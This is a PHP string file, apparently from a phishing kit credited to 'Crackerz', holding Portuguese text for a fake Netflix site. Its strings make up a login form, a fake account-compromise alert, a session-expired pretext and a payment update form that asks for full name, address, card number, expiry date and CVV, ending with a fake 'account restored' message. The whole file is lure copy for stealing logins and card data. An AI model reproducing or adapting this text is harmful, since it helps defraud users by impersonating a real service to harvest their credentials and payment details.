<?php


/* Programmer name :

    ╔╗ ╦ ╦  ╔═╗╦═╗╔═╗╔═╗╦╔═╔═╗╦═╗╔═╗
    ╠╩╗╚╦╝  ║  ╠╦╝╠═╣║  ╠╩╗║╣ ╠╦╝╔═╝
    ╚═╝ ╩   ╚═╝╩╚═╩ ╩╚═╝╩ ╩╚═╝╩╚═╚═╝

*/  #2018  Mailer-inbox-unlimited.gq
    


################################################################################### Login

$crackerz_01 = "Entrar";
$crackerz_02 = "Email";
$crackerz_03 = "Senha";
$crackerz_04 = "Esqueceu seu email ou senha?";
$crackerz_05 = "Lembre de mim";
$crackerz_06 = "Entrar com o Facebook";
$crackerz_07 = "Novo no Netflix?";
$crackerz_08 = "Inscreva-se agora.";

################################################################################### Login



################################################################################### Activity

$crackerz_09 = "Atividade Recente";
$crackerz_10 = "Não reconhece essa atividade?";
$crackerz_11 = "Se você não fez login de um novo dispositivo, sua conta pode ter sido invadida. Siga estas etapas para proteger sua conta o mais rápido possível.";
$crackerz_12 = "INICIAR";

################################################################################### Activity



################################################################################### Redirect

//  Você será automaticamente redirecionado para a home page em 52 segundos.
$crackerz_13 = "Você será automaticamente redirecionado para a ";
$crackerz_14 = "atualizar página em ";
$crackerz_15 = "home page em ";
$crackerz_16 = " segundos.";

################################################################################### Redirect



################################################################################### Infos

$crackerz_17 = "Atualizar informação";
$crackerz_18 = "Atualize suas informações de pagamento.";
$crackerz_19 = "Sua associação não será cobrada no próximo período de faturamento sem validação.";

$crackerz_20 = "Endereço";
$crackerz_21 = "Cidade";
$crackerz_22 = "Estado";
$crackerz_23 = "Código Postal";

$crackerz_24 = "Nome Completo";
$crackerz_25 = "Número do Cartão de Crédito";
$crackerz_26 = "Data de vencimento (MM / AAAA)";
$crackerz_27 = "Código de segurança (CVV)";

################################################################################### Infos



################################################################################### Button

$crackerz_28 = "PRÓXIMO";  
$crackerz_29 = "SALVE";
$crackerz_30 = "COSTAS";

################################################################################### Button



################################################################################### Errors

$crackerz_31 = "Por favor digite um email válido.";
$crackerz_32 = "Sua senha deve conter entre 4 e 60 caracteres.";

$crackerz_33 = "Endereço é um campo obrigatório.";
$crackerz_34 = "Cidade é um campo obrigatório.";
$crackerz_35 = "Estado é um campo obrigatório.";
$crackerz_36 = "Código Postal é um campo obrigatório.";

$crackerz_37 = "Nome completo é um campo obrigatório.";
$crackerz_38 = "O número do cartão é um campo obrigatório.";
$crackerz_39 = "A data de expiração é um campo obrigatório.";
$crackerz_40 = "Código de segurança (CVV) é um campo obrigatório.";

################################################################################### Errors



################################################################################### More time

$crackerz_41 = "Session Expired";
$crackerz_42 = "Session expired please login again to renew your session.";
$crackerz_43 = "Usually this is due to cookies either being cleared or removed from the browser.";
$crackerz_44 = "Press the button bellow to extend session time to confirm your identity and help you access your account.";
$crackerz_45 = "START AGAIN";

################################################################################### More time



################################################################################### Thanks

$crackerz_46 = "Obrigado";

$crackerz_48 = "Parabéns! Você restaurou sua conta. Agora você pode acessar todas as suas vantagens do Netflix.";

$crackerz_50 = "CONTINUAR";

################################################################################### Thanks

################################################################################### Footer

$crackerz_51 = "Questões? Contate-Nos.";

# login / alert / more
$crackerz_52 = "Termos de uso";
$crackerz_53 = "Termos de uso";
$crackerz_54 = "Declaração de privacidade";

$crackerz_55 = "Perguntas frequentes";
$crackerz_56 = "Centro de ajuda";
$crackerz_57 = "Privacidade";
$crackerz_58 = "Preferências de Cookie";
$crackerz_59 = "Informação corporativa";

$crackerz_60 = "Sair";

################################################################################### Footer

?>